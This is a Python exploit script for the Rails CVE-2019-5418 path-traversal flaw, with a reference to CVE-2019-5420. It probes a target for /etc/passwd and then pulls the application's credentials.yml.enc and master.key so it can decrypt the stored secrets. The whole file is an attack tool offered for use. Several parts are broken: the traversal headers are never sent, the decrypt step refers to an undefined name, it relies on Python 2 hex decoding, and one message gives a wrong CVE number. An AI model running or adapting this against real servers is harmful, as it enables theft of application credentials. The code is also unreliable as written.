import argparse
import hashlib
import requests
import base64
from Crypto.Cipher import AES
import sys
from log_colors import *

requests.packages.urllib3.disable_warnings()

# CVE-2019-5420 + CVE-2019-5418
# Rails <5.2.2.1, <6.0.0.beta3.
class CVE2019_5418:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, path):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.path = path.strip("/")
        self.session = requests.Session()

    # check is vulnerable 
    def is_vuln(self):
        print (LogColors.BLUE + "checking if vulnerable to CVE-2019-5418..." + LogColors.ENDC)
        headers = {"Accept" : "../../../../../../../../../../etc/passwd{{"}
        r = self.session.get(self.url + "/" + self.path)
        if r.ok and "root:x:0:0:root:" in r.text:
            print (LogColors.YELLOW + "vulnerable to CVE-2018-5418..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "maybe not vulnerable to CVE-2019-5418" + LogColors.ENDC)
            sys.exit()

    # get credentials.yml.enc file
    def get_credentials(self):
        print (LogColors.BLUE + "get file credentials.yml.enc..." + LogColors.ENDC)
        filepath = "../../../../../../../../../../config/credentials.yml.enc{{"
        headers = {"Accept" : filepath[3:]}
        r = self.session.get(self.url + "/" + self.path)
        if r.ok:
            with open("credentials.yml.enc", "w+") as fp:
                fp.write(r.text)
                self.cred = r.text
                print (LogColors.GREEN + "successfully get credentials file :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed get credentials file :(" + LogColors.ENDC)
            sys.exit()

    # get master.key file
    def get_master_key(self):
        print (LogColors.BLUE + "get file master.key..." + LogColors.ENDC)
        filepath = "../../../../../../../../../../config/master.key{{"
        headers = {"Accept" : filepath[3:]}
        r = self.session.get(self.url + "/" + self.path)
        if r.ok:
            with open("master.key", "w+") as fp:
                fp.write(r.text)
                self.master = r.text
                print (LogColors.GREEN + "successfully get master.key file :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed get master.key file :(" + LogColors.ENDC)
            sys.exit()

    # decode credentials
    def decode_cred(self):
        print (LogColors.BLUE + "decode credentials.yml.enc..." + LogColors.ENDC)
        separator = "--"
        ciphertext_b64, iv_b64, tag_b64 = self.cred.split(separator)
        ciphertext = base64.b64decode(ciphertext_b64)
        iv = base64.b64decode(iv_b64)
        tag = base64.b64decode(tag_b64)
        return (ciphertext, iv, tag)

    # decode master key
    def decode_master(self):
        print (LogColors.BLUE + "decode master.key..." + LogColors.ENDC)
        return self.master.decode("hex")

    # decrypt
    # construct a Cipher object, with the key, iv, and 
    # additionally the
    # GCM tag used for authenticating the message.
    def decrypt(self, key, ciphertext, iv, tag):
        print (LogColors.BLUE + "decrypt..." + LogColors.ENDC)
        cipher = AES.new(key, AES.MODE_GCM, nonce = iv)
        try:
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            print (LogColors.YELLOW + decrypt.decode() + LogColors.ENDC)
            print (LogColors.GREEN + "successfully decrypt :)" + LogColors)
            return decrypted
        except Exception as e:
            print (LogColors.RED + "failed to decrypt :(" + LogColors.ENDC)
            sys.exit()
    
    # encrypt - for re encrypt with tampered session
    def encrypt(self, key, plaintext, iv):
        print (LogColors.BLUE + "encrypt..." + LogColors.ENDC)
        cipher = AES.new(key, AES.MODE_GCM, nonce = iv)
        try:
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            print (LogColors.GREEN + "successfully encrypt :)" + LogColors.ENDC)
            return (ciphertext, iv, tag)
        except Exception:
            print (LogColors.RED + "failed to encrypt :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.is_vuln()
        self.get_credentials()
        self.get_master_key()
        ciphertext, iv, tag = self.decode_cred()
        master = self.decode_master()
        decrypted = self.decrypt(master, ciphertext, iv, tag)
        ciphertext2, iv2, tag2 = self.encrypt(master, decrypted, iv)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-P','--path', required = True, help = "target path")
    args = vars(parser.parse_args())
    url = args['url']
    path = args['path']
    cve = CVE2019_5418(url, path)
    cve.exploit()

